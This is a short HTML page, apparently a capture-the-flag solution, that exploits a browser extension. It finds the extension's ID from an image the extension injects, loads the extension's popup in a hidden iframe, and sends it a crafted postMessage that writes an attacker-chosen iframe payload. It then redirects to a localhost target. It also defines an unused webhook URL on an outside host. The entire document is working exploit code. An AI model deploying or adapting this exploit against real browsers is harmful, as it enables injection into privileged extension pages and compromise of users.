<!DOCTYPE html>
<html>
<body>
    <!-- This triggers the extension to run -->
    <marquee>test</marquee>
    
    <script>
        const WEBHOOK = "https://try-pearl-nine.vercel.app/wow.html";
        
        setTimeout(() => {
            // Wait for extension to replace the marquee with an image
            const img = document.querySelector('img[alt="STOP"]');
            if (img) {
                // Extract extension ID from the image src
                const extId = img.src.split('/')[2];
                console.log('Found extension ID:', extId);
                
                const iframe = document.createElement('iframe');
                iframe.src = `chrome-extension://${extId}/popup.html`;
                iframe.style.display = 'none';
                
                iframe.onload = () => {
                    // Try a simpler payload first
                    const payload = `<iframe src="http://localhost:1337"></iframe>`;
                    
                    iframe.contentWindow.postMessage({
                        type: "SET",
                        replacementString: payload
                    }, "*");
                    
                    setTimeout(() => {
                        window.location.href = 'http://localhost:1337';
                    }, 1000);
                };
                
                document.body.appendChild(iframe);
            } else {
                console.log('No extension image found');
            }
        }, 2000);
    </script>
</body>
</html>
